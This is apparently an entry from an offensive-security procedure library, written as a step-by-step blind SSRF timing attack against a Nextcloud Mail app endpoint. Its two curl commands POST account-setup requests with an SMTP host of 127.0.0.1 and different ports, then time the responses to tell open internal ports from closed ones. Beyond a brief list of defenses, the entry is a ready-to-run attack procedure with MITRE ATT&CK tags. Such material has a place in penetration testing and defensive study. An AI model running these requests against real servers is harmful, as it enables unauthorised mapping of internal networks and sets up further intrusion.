---
id: proc-timing-measure-nextcloud-1746582
tags:
  - timing-attack
  - response-time
  - port-detection
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-post-mail-setup]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:39:09.834Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Active Scanning]]'
---
# Measure-Response-Times-for-Port-Detection

## Summary

This procedure measures response times from SSRF-triggered requests to differentiate open ports (long timeouts) from closed ones (quick failures) in the blind SSRF scenario.

## Description

Without direct output, the attack relies on connection timeouts: open ports cause ~5s delays during SMTP attempts, while closed ports return instantly. Repeating this allows inference of port states on internal hosts.

## Requirements

1. Script or manual timing of multiple requests
2. Baseline timing for closed ports (<100ms)
3. Access to send repeated POSTs

## Defense

Defensive measures and detection strategies:

- Normalize response times with fixed delays
- Block localhost/internal IPs in outbound connections
- Alert on high-volume account setup attempts

## Objectives

1. Identify open ports via delay thresholds
2. Establish reliable timing baseline
3. Enable service enumeration

## Instructions

### Step 1: Time Single Request

**Context**: Send request and record elapsed time.

**Command** ([[commands/curl-post-mail-setup]]):
```bash
curl -w "%{time_total}" -X POST -H "OCS-APIRequest: true" -H "Content-Type: application/json" -d '{"smtpHost":"127.0.0.1","smtpPort":8080,"smtpSslMode":"none"}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

> Uses -w for timing. Expected output: Response time in seconds, e.g., 5.140s for open port.

### Step 2: Compare Baselines

**Context**: Test known closed port for comparison.

**Command** ([[commands/curl-post-mail-setup]]):
```bash
curl -w "%{time_total}" -X POST -H "OCS-APIRequest: true" -H "Content-Type: application/json" -d '{"smtpHost":"127.0.0.1","smtpPort":9999,"smtpSslMode":"none"}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

> Targets invalid port. Expected output: <0.100s response.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Active Scanning]] Active Scanning

### Sub-Techniques


## Commands Used

- [[commands/curl-post-mail-setup]]

## Tools Used

- [[tools/curl]]

## Tags

- timing-attack
- response-time
- port-detection
